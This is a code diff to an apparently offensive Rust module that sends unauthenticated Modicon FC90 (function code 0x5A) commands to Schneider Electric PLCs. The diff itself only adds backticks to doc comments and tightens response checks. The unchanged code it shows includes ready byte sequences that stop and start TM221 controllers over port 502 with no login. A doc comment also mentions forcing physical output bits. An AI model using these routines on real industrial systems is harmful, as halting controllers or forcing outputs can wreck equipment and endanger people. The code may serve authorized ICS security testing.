@@ -1,7 +1,7 @@
 /// Schneider Electric Modicon FC90 (function code 0x5A) proprietary unauthenticated PLC control.
 ///
 /// Targets M340, Quantum, Premium, and TM221 PLCs via port 502.
-/// No authentication required. Sourced from ISF (ICS Security Framework) modbus_fc90 module
+/// No authentication required. Sourced from ISF (ICS Security Framework) `modbus_fc90` module
 /// and public ICS-Security-Tools research.
 use anyhow::Result;
 use std::io::{Read, Write};
@@ -19,7 +19,7 @@ pub enum ForceState {
     Unforce,
 }
 
-/// `port = 0` → use FC90_PORT (502).
+/// `port = 0` → use `FC90_PORT` (502).
 fn connect(ip: &str, port: u16) -> Result<TcpStream> {
     let effective_port = if port == 0 { FC90_PORT } else { port };
     let addr = format!("{ip}:{effective_port}");
@@ -75,22 +75,22 @@ pub fn start_plc(ip: &str, port: u16) -> Result<bool> {
     Ok(check_ack(&resp))
 }
 
-/// Stop a TM221 (SoMachine Basic) PLC. No init sequence required.
+/// Stop a TM221 (`SoMachine` Basic) PLC. No init sequence required.
 pub fn stop_tm221(ip: &str, port: u16) -> Result<bool> {
     let mut stream = connect(ip, port)?;
     let stop = [0x01u8, 0x5A, 0xC9, 0x41, 0xFF, 0x00];
     let resp = send_recv_fc90(&mut stream, &stop)
         .ok_or_else(|| anyhow::anyhow!("no response from FC90 TM221 stop on {ip}"))?;
-    Ok(resp.len() >= 4 && resp[1] == 0x5A)
+    Ok(resp.len() >= 4 && resp[1] == 0x5A && resp[3] == 0x04)
 }
 
-/// Start a TM221 (SoMachine Basic) PLC. No init sequence required.
+/// Start a TM221 (`SoMachine` Basic) PLC. No init sequence required.
 pub fn start_tm221(ip: &str, port: u16) -> Result<bool> {
     let mut stream = connect(ip, port)?;
     let start = [0x01u8, 0x5A, 0xC9, 0x40, 0xFF, 0x00];
     let resp = send_recv_fc90(&mut stream, &start)
         .ok_or_else(|| anyhow::anyhow!("no response from FC90 TM221 start on {ip}"))?;
-    Ok(resp.len() >= 4 && resp[1] == 0x5A)
+    Ok(resp.len() >= 4 && resp[1] == 0x5A && resp[3] == 0x04)
 }
 
 /// Force a physical output bit via FC90 subcommand 0x71.
